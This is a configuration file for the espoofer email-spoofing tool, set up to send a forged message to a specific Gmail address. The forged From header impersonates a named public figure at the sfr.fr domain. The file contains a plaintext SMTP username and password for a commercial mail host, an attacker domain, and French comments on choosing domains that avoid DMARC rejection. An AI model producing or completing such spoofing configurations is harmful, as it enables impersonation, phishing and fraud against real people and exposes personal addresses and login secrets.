config = {
	"attacker_site": b"emailmaster.cloud", # attack.com
	"legitimate_site_address": b"contact@emailmaster.cloud", # From header address displayed to the end-user
	"victim_address": b"laurentvial778@gmail.com", # RCPT TO and message.To header address, 
	"case_id": b"client_a3", #  You can find all case_id using -l option.

	# The following fields are optional
	"server_mode":{
		"recv_mail_server": "", # If no value, espoofer will query the victim_address to get the mail server ip
		"recv_mail_server_port": 25,
		"starttls": False,
	},
	"client_mode": {
		"sending_server": ("smtp.hostinger.com", 587),
		"username": b"contact@emailmaster.cloud",
		"password": b"@123passkeY",
	},

	# Optional. You can leave them empty or customize the email message header or body here
	"subject_header": b"Bonjour, je suis Pierre Vial",  # Subject: Test espoofer\r\n
	"to_header": b"<laurentvial778@gmail.com>", # To: <alice@example.com>\r\n
	"body": b"test", # Test Body.
	"sender_name": b"Xavier Niel", # Nom de l'expéditeur (ex: b"John Doe" pour afficher "John Doe <email@domain.com>")
	"from_email": b"xavier@sfr.fr", # Email d'expédition dans le header From (pour spoofing). 
	# ATTENTION: Gmail rejette les emails spoofés de gmail.com à cause de DMARC.
	# Utilisez un domaine que vous contrôlez ou qui n'a pas de politique DMARC stricte.
	# Si vide, utilise legitimate_site_address
	"reply_to": b"reply@example.com", # Reply-To header (ex: b"reply@example.com" ou b"<reply@example.com>"). Si vide, pas de Reply-To header.

	# Optional. Set the raw email message you want to sent. It's usually used for replay attacks
	"raw_email": b"", 
}



